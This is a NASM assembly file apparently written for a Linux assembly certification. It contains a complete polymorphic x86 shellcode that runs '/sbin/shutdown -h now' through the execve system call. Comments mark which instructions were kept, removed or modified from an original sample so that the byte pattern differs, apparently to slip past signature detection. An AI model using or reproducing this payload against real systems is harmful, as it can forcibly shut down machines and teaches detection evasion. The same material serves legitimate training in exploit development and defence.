; Filename: shutdown_now_polymorphic.nasm
; Author:  David Alvarez Robles (km0xu95)
; Website:  https://blog.asturhackers.es
;
; Purpose: This assembly file has been created for completing the requirements of the SecurityTube Linux Assembly Expert (SLAE) certification

global _start

section .text
_start:
xor eax,eax			; Kept
;xor edx,edx			; Removed
push eax			; Kept
push word 0x682d		; Kept
;mov edi,esp			; Removed
push eax			; Kept
push byte +0x6e			; Kept
mov word [esp+0x1],0x776f	; Kept
mov edi,esp			; Kept
push eax			; Kept
push dword 0x6e776f64		; Kept "nwod"
push dword 0x74756873		; Kept "tuhs"
push dword 0x2f2f6e69		; Modified "//ni"
push dword 0x62732f2f		; Modified "bs//"
mov ebx,esp			; Kept
push eax			; Modified
push eax			; Modified
push edi			; Kept
push ebx			; Kept
mov ecx,esp			; Kept
add al,0xb			; Modified
int 0x80			; Kept
